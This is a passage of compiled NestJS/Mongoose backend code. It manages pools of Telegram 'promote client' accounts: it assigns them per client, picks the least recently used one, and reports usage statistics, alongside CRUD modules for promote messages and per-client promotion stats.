            ]),
            this.promoteClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'active',
                        lastUsed: { $gte: last24Hours },
                    },
                },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
        ]);
        const assignedCountMap = new Map(assignedCounts.map((item) => [item._id, item.count]));
        const activeCountMap = new Map(activeCounts.map((item) => [item._id, item.count]));
        const inactiveCountMap = new Map(inactiveCounts.map((item) => [item._id, item.count]));
        const neverUsedCountMap = new Map(neverUsedCounts.map((item) => [item._id, item.count]));
        const recentlyUsedCountMap = new Map(recentlyUsedCounts.map((item) => [item._id, item.count]));
        const distributionPerClient = [];
        let clientsWithSufficient = 0;
        let clientsNeedingMore = 0;
        let totalNeeded = 0;
        for (const client of clients) {
            const assignedCount = assignedCountMap.get(client.clientId) || 0;
            const activeCount = activeCountMap.get(client.clientId) || 0;
            const inactiveCount = inactiveCountMap.get(client.clientId) || 0;
            const neverUsed = neverUsedCountMap.get(client.clientId) || 0;
            const usedInLast24Hours = recentlyUsedCountMap.get(client.clientId) || 0;
            const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - activeCount);
            const status = needed === 0 ? 'sufficient' : 'needs_more';
            distributionPerClient.push({
                clientId: client.clientId,
                assignedCount,
                activeCount,
                inactiveCount,
                needed,
                status,
                neverUsed,
                usedInLast24Hours,
            });
            if (status === 'sufficient') {
                clientsWithSufficient++;
            }
            else {
                clientsNeedingMore++;
                totalNeeded += needed;
            }
        }
        const maxPerTrigger = 10;
        const triggersNeeded = Math.ceil(totalNeeded / maxPerTrigger);
        return {
            totalPromoteClients,
            unassignedPromoteClients,
            activePromoteClients,
            inactivePromoteClients,
            distributionPerClient,
            summary: {
                clientsWithSufficientPromoteClients: clientsWithSufficient,
                clientsNeedingPromoteClients: clientsNeedingMore,
                totalPromoteClientsNeeded: totalNeeded,
                maxPromoteClientsPerTrigger: maxPerTrigger,
                triggersNeededToSatisfyAll: triggersNeeded,
            },
        };
    }
    async getPromoteClientsByStatus(status) {
        return this.promoteClientModel.find({ status }).exec();
    }
    async getPromoteClientsWithMessages() {
        return this.promoteClientModel
            .find({}, { mobile: 1, status: 1, message: 1, clientId: 1, lastUsed: 1 })
            .exec();
    }
    async getLeastRecentlyUsedPromoteClients(clientId, limit = 1) {
        return this.promoteClientModel
            .find({ clientId, status: 'active' })
            .sort({ lastUsed: 1, _id: 1 })
            .limit(limit)
            .exec();
    }
    async getNextAvailablePromoteClient(clientId) {
        const clients = await this.getLeastRecentlyUsedPromoteClients(clientId, 1);
        return clients.length > 0 ? clients[0] : null;
    }
    async getUnusedPromoteClients(hoursAgo = 24, clientId) {
        const cutoffDate = new Date(Date.now() - hoursAgo * 60 * 60 * 1000);
        const filter = {
            status: 'active',
            $or: [
                { lastUsed: { $lt: cutoffDate } },
                { lastUsed: { $exists: false } },
                { lastUsed: null },
            ],
        };
        if (clientId) {
            filter.clientId = clientId;
        }
        return this.promoteClientModel.find(filter).exec();
    }
    async getUsageStatistics(clientId) {
        const filter = { status: 'active' };
        if (clientId) {
            filter.clientId = clientId;
        }
        const now = new Date();
        const last24Hours = new Date(now.getTime() - 24 * 60 * 60 * 1000);
        const lastWeek = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        const [totalClients, neverUsed, usedInLast24Hours, usedInLastWeek, allClients,] = await Promise.all([
            this.promoteClientModel.countDocuments(filter),
            this.promoteClientModel.countDocuments({
                ...filter,
                $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }],
            }),
            this.promoteClientModel.countDocuments({
                ...filter,
                lastUsed: { $gte: last24Hours },
            }),
            this.promoteClientModel.countDocuments({
                ...filter,
                lastUsed: { $gte: lastWeek },
            }),
            this.promoteClientModel
                .find(filter, { lastUsed: 1, createdAt: 1 })
                .exec(),
        ]);
        let totalGap = 0;
        let gapCount = 0;
        for (const client of allClients) {
            if (client.lastUsed) {
                const gap = now.getTime() - new Date(client.lastUsed).getTime();
                totalGap += gap;
                gapCount++;
            }
        }
        const averageUsageGap = gapCount > 0 ? totalGap / gapCount / (60 * 60 * 1000) : 0;
        return {
            totalClients,
            neverUsed,
            usedInLast24Hours,
            usedInLastWeek,
            averageUsageGap,
        };
    }
    createTimeout(callback, delay) {
        const timeout = setTimeout(() => {
            this.activeTimeouts.delete(timeout);
            callback();
        }, delay);
        this.activeTimeouts.add(timeout);
        return timeout;
    }
};
exports.PromoteClientService = PromoteClientService;
exports.PromoteClientService = PromoteClientService = PromoteClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(promote_client_schema_1.PromoteClient.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => channels_service_1.ChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
    __param(7, (0, common_1.Inject)((0, common_1.forwardRef)(() => session_manager_1.SessionService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        buffer_client_service_1.BufferClientService,
        session_manager_1.SessionService])
], PromoteClientService);


/***/ }),

/***/ "./src/components/promote-clients/schemas/index.ts":
/*!*********************************************************!*\
  !*** ./src/components/promote-clients/schemas/index.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts"), exports);


/***/ }),

/***/ "./src/components/promote-clients/schemas/promote-client.schema.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/schemas/promote-client.schema.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientSchema = exports.PromoteClient = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let PromoteClient = class PromoteClient {
};
exports.PromoteClient = PromoteClient;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "tgId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "mobile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "lastActive", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "availableDate", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, type: Number }),
    __metadata("design:type", Number)
], PromoteClient.prototype, "channels", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "clientId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: 'active' }),
    __metadata("design:type", String)
], PromoteClient.prototype, "status", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: 'Account is functioning properly' }),
    __metadata("design:type", String)
], PromoteClient.prototype, "message", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "lastUsed", void 0);
exports.PromoteClient = PromoteClient = __decorate([
    (0, mongoose_1.Schema)({ collection: 'promoteClients', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], PromoteClient);
exports.PromoteClientSchema = mongoose_1.SchemaFactory.createForClass(PromoteClient);
exports.PromoteClientSchema.index({ clientId: 1 });


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.controller.ts":
/*!****************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.controller.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_msgs_service_1 = __webpack_require__(/*! ./promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
let PromoteMsgsController = class PromoteMsgsController {
    constructor(promoteMsgsService) {
        this.promoteMsgsService = promoteMsgsService;
    }
    async findOne() {
        return this.promoteMsgsService.findOne();
    }
    async update(updateClientDto) {
        return this.promoteMsgsService.update(updateClientDto);
    }
};
exports.PromoteMsgsController = PromoteMsgsController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get promote-msgs data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteMsgsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update promote-msgs' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteMsgsController.prototype, "update", null);
exports.PromoteMsgsController = PromoteMsgsController = __decorate([
    (0, swagger_1.ApiTags)('Promote-msgs'),
    (0, common_1.Controller)('promote-msgs'),
    __metadata("design:paramtypes", [promote_msgs_service_1.PromoteMsgsService])
], PromoteMsgsController);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.module.ts":
/*!************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.module.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_msgs_service_1 = __webpack_require__(/*! ./promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
const promote_msgs_controller_1 = __webpack_require__(/*! ./promote-msgs.controller */ "./src/components/promote-msgs/promote-msgs.controller.ts");
const promote_msgs_schema_1 = __webpack_require__(/*! ./promote-msgs.schema */ "./src/components/promote-msgs/promote-msgs.schema.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let PromoteMsgModule = class PromoteMsgModule {
};
exports.PromoteMsgModule = PromoteMsgModule;
exports.PromoteMsgModule = PromoteMsgModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            PromoteMsgModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: promote_msgs_schema_1.PromoteMsgSchema }]),
        ],
        providers: [promote_msgs_service_1.PromoteMsgsService],
        controllers: [promote_msgs_controller_1.PromoteMsgsController],
        exports: [promote_msgs_service_1.PromoteMsgsService],
    })
], PromoteMsgModule);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.schema.ts":
/*!************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.schema.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgSchema = exports.PromoteMsg = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let PromoteMsg = class PromoteMsg {
};
exports.PromoteMsg = PromoteMsg;
exports.PromoteMsg = PromoteMsg = __decorate([
    (0, mongoose_1.Schema)({ versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        }, })
], PromoteMsg);
exports.PromoteMsgSchema = mongoose_1.SchemaFactory.createForClass(PromoteMsg);
exports.PromoteMsgSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.service.ts":
/*!*************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.service.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgsService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let PromoteMsgsService = class PromoteMsgsService {
    constructor(promotemsgModel) {
        this.promotemsgModel = promotemsgModel;
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async findOne() {
        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`promotemsgModel not found`);
        }
        return user;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.promotemsgModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`promotemsgModel not found`);
        }
        return updatedUser;
    }
};
exports.PromoteMsgsService = PromoteMsgsService;
exports.PromoteMsgsService = PromoteMsgsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('promotemsgModule')),
    __metadata("design:paramtypes", [mongoose_2.Model])
], PromoteMsgsService);


/***/ }),

/***/ "./src/components/promote-stats/dto/create-promote-stat.dto.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/dto/create-promote-stat.dto.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreatePromoteStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreatePromoteStatDto {
}
exports.CreatePromoteStatDto = CreatePromoteStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID' }),
    __metadata("design:type", String)
], CreatePromoteStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: { "Girls_Chating_Group_07": 4, "girls_friends_chatting_group_01": 14 }, description: 'Data' }),
    __metadata("design:type", Map)
], CreatePromoteStatDto.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 552, description: 'Total Count' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 314, description: 'Unique Channels' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "uniqueChannels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Release Day' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "releaseDay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719860106247.0, description: 'Last Updated TimeStamp' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "lastUpdatedTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Is Active' }),
    __metadata("design:type", Boolean)
], CreatePromoteStatDto.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ["And_Girls_Boys_Group_Chatting", "Girls_Chating_Group_07"], description: 'Channels' }),
    __metadata("design:type", Array)
], CreatePromoteStatDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/promote-stats/dto/update-promote-stat.dto.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/dto/update-promote-stat.dto.ts ***!
  \*********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdatePromoteStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_promote_stat_dto_1 = __webpack_require__(/*! ./create-promote-stat.dto */ "./src/components/promote-stats/dto/create-promote-stat.dto.ts");
class UpdatePromoteStatDto extends (0, swagger_1.PartialType)(create_promote_stat_dto_1.CreatePromoteStatDto) {
}
exports.UpdatePromoteStatDto = UpdatePromoteStatDto;


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.controller.ts":
/*!*****************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.controller.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_stat_service_1 = __webpack_require__(/*! ./promote-stat.service */ "./src/components/promote-stats/promote-stat.service.ts");
const create_promote_stat_dto_1 = __webpack_require__(/*! ./dto/create-promote-stat.dto */ "./src/components/promote-stats/dto/create-promote-stat.dto.ts");
const update_promote_stat_dto_1 = __webpack_require__(/*! ./dto/update-promote-stat.dto */ "./src/components/promote-stats/dto/update-promote-stat.dto.ts");
let PromoteStatController = class PromoteStatController {
    constructor(promoteStatService) {
        this.promoteStatService = promoteStatService;
    }
    async create(createPromoteStatDto) {
        return this.promoteStatService.create(createPromoteStatDto);
    }
    async findByClient(client) {
        return this.promoteStatService.findByClient(client);
    }
    async update(client, updatePromoteStatDto) {
        return this.promoteStatService.update(client, updatePromoteStatDto);
    }
    async deleteOne(client) {
        return this.promoteStatService.deleteOne(client);
    }
    async deleteAll() {
        return this.promoteStatService.deleteAll();
    }
};
exports.PromoteStatController = PromoteStatController;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_promote_stat_dto_1.CreatePromoteStatDto]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "findByClient", null);
__decorate([
    (0, common_1.Put)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_stat_dto_1.UpdatePromoteStatDto]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "deleteAll", null);
exports.PromoteStatController = PromoteStatController = __decorate([
    (0, swagger_1.ApiTags)('promote-stats'),
    (0, common_1.Controller)('promote-stats'),
    __metadata("design:paramtypes", [promote_stat_service_1.PromoteStatService])
], PromoteStatController);


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.module.ts":
/*!*************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.module.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatModule = void 0;
const init_module_1 = __webpack_require__(/*! ./../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_stat_service_1 = __webpack_require__(/*! ./promote-stat.service */ "./src/components/promote-stats/promote-stat.service.ts");
const promote_stat_controller_1 = __webpack_require__(/*! ./promote-stat.controller */ "./src/components/promote-stats/promote-stat.controller.ts");
const promote_stat_schema_1 = __webpack_require__(/*! ./schemas/promote-stat.schema */ "./src/components/promote-stats/schemas/promote-stat.schema.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
let PromoteStatModule = class PromoteStatModule {
};
exports.PromoteStatModule = PromoteStatModule;
exports.PromoteStatModule = PromoteStatModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: promote_stat_schema_1.PromoteStat.name, collection: "promoteStats", schema: promote_stat_schema_1.PromoteStatSchema }]),
            client_module_1.ClientModule
        ],
        controllers: [promote_stat_controller_1.PromoteStatController],
        providers: [promote_stat_service_1.PromoteStatService],
        exports: [promote_stat_service_1.PromoteStatService]
    })
], PromoteStatModule);


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.service.ts":
/*!**************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.service.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const promote_stat_schema_1 = __webpack_require__(/*! ./schemas/promote-stat.schema */ "./src/components/promote-stats/schemas/promote-stat.schema.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
let PromoteStatService = class PromoteStatService {
    constructor(promoteStatModel, clientService) {
        this.promoteStatModel = promoteStatModel;
        this.clientService = clientService;
    }
    async create(createPromoteStatDto) {
        const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);
        return createdPromoteStat.save();
    }
    async findAll() {
        const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();
        return promoteStat;
    }
    async findByClient(client) {
        const promoteStat = await this.promoteStatModel.findOne({ client }).exec();
        if (!promoteStat) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
        return promoteStat;
    }
    async update(client, updatePromoteStatDto) {
        const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();
        if (!promoteStat) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
        return promoteStat;
    }
    async deleteOne(client) {
        const result = await this.promoteStatModel.deleteOne({ client }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
    }
